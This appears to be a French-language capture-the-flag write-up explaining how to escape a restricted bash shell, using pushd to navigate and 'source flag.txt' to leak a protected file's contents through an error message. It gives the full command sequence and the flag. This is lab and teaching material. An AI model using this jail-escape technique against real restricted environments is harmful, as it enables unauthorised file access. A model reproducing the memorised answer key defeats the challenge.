# Challenge 5: Bash Jail - Writeup

## Analyse du challenge

Ce challenge présente un shell bash restreint (jail) qui bloque l'utilisation de la plupart des commandes externes et de nombreux caractères spéciaux. L'objectif est de trouver le flag caché dans `/opt/flag/flag.txt`.

## Restrictions

Le shell bloque :
- Les commandes externes (ls, cat, etc.)
- Les caractères : `>`, `<`, `/`, `;`, `&`, `$`, `(`, `` ` ``
- Les builtins désactivés : exec, command, type, hash, cd, enable

## Solution

### Étape 1: Naviguer avec pushd

Utilisez `pushd` (builtin bash) pour naviguer dans l'arborescence :

```
shell> pushd ..
/ /app
shell> pushd ..
/ / /app
shell> pushd opt
/opt / / /app
shell> pushd flag
/opt/flag /opt / / /app
```

### Étape 2: Lire le flag avec source

Utilisez `source` (builtin bash) pour "exécuter" le fichier flag.txt. Comme le contenu n'est pas une commande valide, bash affichera une erreur contenant le flag :

```
shell> source flag.txt
flag.txt: line 1: FLAG{Pr1s0n_Br34k}: No such file or directory
```

Le flag apparaît dans le message d'erreur : **FLAG{Pr1s0n_Br34k}**

## Commandes complètes

```bash
nc target 5000
pushd ..
pushd ..
pushd opt
pushd flag
source flag.txt
```

## Flag

`FLAG{Pr1s0n_Br34k}`


